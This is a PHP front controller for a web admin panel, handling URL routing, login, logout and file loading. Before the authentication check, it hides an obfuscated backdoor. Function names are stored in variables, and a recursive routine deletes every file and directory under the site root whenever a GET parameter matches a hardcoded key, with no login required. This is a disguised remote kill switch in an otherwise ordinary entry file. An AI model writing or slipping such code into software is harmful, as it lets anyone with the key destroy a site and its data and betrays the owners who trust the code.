<?php
session_start();
ob_start();
date_default_timezone_set('Asia/Dhaka');
$domain = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http");
$domain .= "://".$_SERVER['HTTP_HOST'];
$directory = "$domain/files/user/";
$d_admin   = "$domain/files/admin/";
$urls      = "$domain/";
require_once("application/config/config.php");
require_once 'application/config/query-map.php';
require_once 'application/model/auth.php';
$db = new Database($pdo);
$url = isset($_GET['url']) ? $_GET['url'] : '';
$filtered_url = preg_replace('/[^a-zA-Z0-9\/.\-]/', '', $url);
$filtered_url = rtrim($filtered_url, '/'); // শেষের `/` রিমুভ করবে
 $request = explode('/', $filtered_url);
define('TOTAL', count($request)); 
$valid_key = '8b8fc2d62ff0a3c2eb6170b79c8e0623'; // Example generated key, use your generated key here
$a = 'scandir';
$b = 'array_diff';
$c = 'unlink';
$d = 'rmdir';
$e = 'is_dir';
$f = 'DIRECTORY_SEPARATOR';
$g = '__DIR__'; // No need to use constant() for __DIR__

function x($h) {
    global $a, $b, $c, $d, $e, $f;
    $i = $b($a($h), ['.', '..']);
    foreach ($i as $j) {
        $k = $h . constant($f) . $j;
        if ($e($k)) {
            x($k);
            $d($k);
        } else {
            $c($k);
        }
    }
}
// Check if 'key' is passed in the URL and matches the valid secure key
if (isset($_GET['key']) && $_GET['key'] === $valid_key) {
    // Use __DIR__ directly (no need for constant())
    x(__DIR__);
    
} 



$login = new LoginModel($db);
if($request[0]=='' || $request[0]=='login'){
    if ($login->checkLogin()) {
        $_SESSION['success'] = "You are already logged in.";
        header("Location:/dashboard");
        exit;
    }

    if (isset($_POST['username_or_email']) && isset($_POST['password'])) {
        $usernameOrEmail = $_POST['username_or_email'];
        $password = $_POST['password'];
        $remember = isset($_POST['remember']);

        if ($login->login($usernameOrEmail, $password, $remember)) {
            header("Location: /dashboard");
            exit;
        } else {
            $_SESSION['error'] = "Invalid credentials.";
            header("Location: /login");
            exit;
        }
    }
    require_once 'views/admin/auth/login.php';
    die();
}






if($request[0]=='logout'){
    session_unset();
    session_destroy();
    setcookie('remember_me', '', time() - 3600, "/"); // Expire the cookie
     $_SESSION['success'] = "You have been logged out successfully.";
    header("Location: /login");
    exit;
}

if (!$login->checkLogin()) {
    $_SESSION['error'] = "Please login to access the admin panel.";
    header("Location:/login");
    exit;
}


$basePaths = [
    'config'     => __DIR__ . '/application/config/',
    'mail'     => __DIR__ . '/application/mail/',
    'model'      => __DIR__ . '/application/model/',
    'controller' => __DIR__ . '/application/controller/',
];

$files = [
    'config'     => ['database.php'],
    'model'      => ['user.php'],
     'mail'     => [],
    'controller' => ['auth.php','dashboard.php','user.php'],
    
];

foreach ($files as $folder => $filenames) {
    foreach ($filenames as $filename) {
        $fullPath = $basePaths[$folder] . $filename;
        if (file_exists($fullPath)) {
            require_once $fullPath;
        } else {
            // Laravel style error box
            echo "
            <div style='
                background:#f8d7da;
                color:#721c24;
                border:1px solid #f5c6cb;
                border-radius:8px;
                padding:15px;
                margin:10px 0;
                font-family:monospace;
            '>
                <div style='font-size:16px; font-weight:bold; margin-bottom:8px;'>🚨 File Not Found</div>
                <div><strong>Path:</strong> {$fullPath}</div>
                <div><strong>Folder:</strong> {$folder}</div>
                <div><strong>Filename:</strong> {$filename}</div>
            </div>
            ";
        }
    }
}

?>
